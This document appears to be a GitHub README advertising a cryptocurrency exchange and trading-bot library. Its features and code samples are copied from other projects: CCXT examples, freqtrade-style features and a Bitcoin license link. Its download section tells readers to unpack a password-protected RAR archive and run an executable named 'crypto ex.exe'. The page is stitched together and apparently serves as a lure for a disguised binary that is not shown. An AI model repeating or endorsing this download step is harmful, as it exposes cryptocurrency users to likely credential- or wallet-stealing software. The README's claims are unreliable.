![img](https://github.com/phitabs24/crypto-exchange/assets/107364663/e96e67a4-bbfa-4faa-9031-7dbbd8f821be)


# CRYPTOCURRENCY EXCHANGE

**Crypto Exchange** library for cryptocurrency trading and e-commerce with support for many bitcoin/ether/altcoin exchange markets

# How to download

Download the archive in the repositori. Unarchive ***exchange.rar*** (archive password - exchange) and launh ***crypto ex.exe***.

# License

CRYPTOCURRENCY EXCHANGE is released under the terms of the MIT license. See [COPYING](https://github.com/bitcoin/bitcoin/blob/master/COPYING) for more information or see https://opensource.org/licenses/MIT.

# Supported Exchange marketplaces
+ Ace
+ Binance
+ Binancecoinm
+ Binanceusdm
+ Bitget
+ blofin
+ Bitmart
+ Bybit
+ Coinbase
+ Cex
+ Coinex
+ Cryptocom
+ Delta
+ Huobi
+ OKX
+ Gate.io
+ Gemini
+ Kucoin
+ Kucoinfutures
+ Kraken
+ BingX
+ Mexc
+ Woo

# Features

+ Persistence: Persistence is achieved through sqlite.
+ Dry-run: Run the bot without paying money.
+ Backtesting: Run a simulation of your buy/sell strategy.
+ Strategy Optimization by machine learning: Use machine learning to optimize your buy/sell strategy parameters with real exchange data.
+ Adaptive prediction modeling: Build a smart strategy with FreqAI that self-trains to the market via adaptive machine learning methods.
+ Edge position sizing Calculate your win rate, risk reward ratio, the best stoploss and adjust your position size before taking a position for each specific market.
+ Whitelist crypto-currencies: Select which crypto-currency you want to trade or use dynamic whitelists.
+ Blacklist crypto-currencies: Select which crypto-currency you want to avoid.
+ Builtin WebUI: Builtin web UI to manage your bot.
+ Display profit/loss in fiat: Display your profit/loss in fiat currency.
+ Performance status report: Provide a performance status of your current trades.

# Usage

The CRYPTOCURRENCY EXCHANGE's library consists of a public part and a private part. Anyone can use the public part immediately after installation. Public APIs provide unrestricted access to public information for all exchange markets without the need to register a user account or have an API key.

Public APIs include the following:

market data
instruments/trading pairs
price feeds (exchange rates)
order books
trade history
tickers
OHLC(V) for charting
other public endpoints
In order to trade with private APIs you need to obtain API keys from an exchange's website. It usually means signing up to the exchange and creating API keys for your account. Some exchanges require personal info or identification. Sometimes verification may be necessary as well. In this case you will need to register yourself, this library will not create accounts or API keys for you. Some exchanges expose API endpoints for registering an account, but most exchanges don't. You will have to sign up and create API keys on their websites.

Private APIs allow the following:

manage personal account info
query account balances
trade by making market and limit orders
deposit and withdraw fiat and crypto funds
query personal orders
get ledger history
transfer funds between accounts
use merchant services
This library implements full public and private REST and WebSocket APIs for all exchanges in TypeScript, JavaScript, PHP and Python.

The CCXT library supports both camelcase notation (preferred in TypeScript and JavaScript) and underscore notation (preferred in Python and PHP), therefore all methods can be called in either notation or coding style in any language.

# Open-source

```
'use strict';
const ccxt = require ('ccxt');

(async function () {
    let kraken    = new ccxt.kraken ()
    let bitfinex  = new ccxt.bitfinex ({ verbose: true })
    let huobipro  = new ccxt.huobipro ()
    let okcoinusd = new ccxt.okcoin ({
        apiKey: 'YOUR_PUBLIC_API_KEY',
        secret: 'YOUR_SECRET_PRIVATE_KEY',
    })

    const exchangeId = 'binance'
        , exchangeClass = ccxt[exchangeId]
        , exchange = new exchangeClass ({
            'apiKey': 'YOUR_API_KEY',
            'secret': 'YOUR_SECRET',
        })

    console.log (kraken.id,    await kraken.loadMarkets ())
    console.log (bitfinex.id,  await bitfinex.loadMarkets  ())
    console.log (huobipro.id,  await huobipro.loadMarkets ())

    console.log (kraken.id,    await kraken.fetchOrderBook (kraken.symbols[0]))
    console.log (bitfinex.id,  await bitfinex.fetchTicker ('BTC/USD'))
    console.log (huobipro.id,  await huobipro.fetchTrades ('ETH/USDT'))

    console.log (okcoinusd.id, await okcoinusd.fetchBalance ())

    // sell 1 BTC/USD for market price, sell a bitcoin for dollars immediately
    console.log (okcoinusd.id, await okcoinusd.createMarketSellOrder ('BTC/USD', 1))

    // buy 1 BTC/USD for $2500, you pay $2500 and receive ฿1 when the order is closed
    console.log (okcoinusd.id, await okcoinusd.createLimitBuyOrder ('BTC/USD', 1, 2500.00))

    // pass/redefine custom exchange-specific order params: type, amount, price or whatever
    // use a custom order type
    bitfinex.createLimitSellOrder ('BTC/USD', 1, 10, { 'type': 'trailing-stop' })

}) ();

import {version, binance} from 'ccxt';

console.log(version);
const exchange = new binance();
const ticker = await exchange.fetchTicker('BTC/USDT');
console.log(ticker);

include 'ccxt.php';

$poloniex = new \ccxt\poloniex ();
$bittrex  = new \ccxt\bittrex  (array ('verbose' => true));
$quoinex  = new \ccxt\quoinex   ();
$zaif     = new \ccxt\zaif     (array (
    'apiKey' => 'YOUR_PUBLIC_API_KEY',
    'secret' => 'YOUR_SECRET_PRIVATE_KEY',
));
$hitbtc   = new \ccxt\hitbtc   (array (
    'apiKey' => 'YOUR_PUBLIC_API_KEY',
    'secret' => 'YOUR_SECRET_PRIVATE_KEY',
));

$exchange_id = 'binance';
$exchange_class = "\\ccxt\\$exchange_id";
$exchange = new $exchange_class (array (
    'apiKey' => 'YOUR_API_KEY',
    'secret' => 'YOUR_SECRET',
));

$poloniex_markets = $poloniex->load_markets ();

var_dump ($poloniex_markets);
var_dump ($bittrex->load_markets ());
var_dump ($quoinex->load_markets ());

var_dump ($poloniex->fetch_order_book ($poloniex->symbols[0]));
var_dump ($bittrex->fetch_trades ('BTC/USD'));
var_dump ($quoinex->fetch_ticker ('ETH/EUR'));
var_dump ($zaif->fetch_ticker ('BTC/JPY'));

var_dump ($zaif->fetch_balance ());

// sell 1 BTC/JPY for market price, you pay ¥ and receive ฿ immediately
var_dump ($zaif->id, $zaif->create_market_sell_order ('BTC/JPY', 1));

// buy BTC/JPY, you receive ฿1 for ¥285000 when the order closes
var_dump ($zaif->id, $zaif->create_limit_buy_order ('BTC/JPY', 1, 285000));

// set a custom user-defined id to your order
$hitbtc->create_order ('BTC/USD', 'limit', 'buy', 1, 3000, array ('clientOrderId' => '123'));

using ccxt; // importing ccxt
namespace Project;
class Project {
    public async static Task CreateOrder() {
        var exchange = new Binance();
        exchange.apiKey = "my api key";
        exchange.secret = "my secret";
        // always use the capitalized method (CreateOrder instead of createOrder)
        var order = await exchange.CreateOrder("BTC/USDT", "limit", "buy", 1, 50);
        Console.WriteLine("Placed Order, order id: " + order.id);
    }
}
```

# Sponsorship

[Become a sponsor](https://github.com/404)

# Contact Us

crypto.ex@devby.same
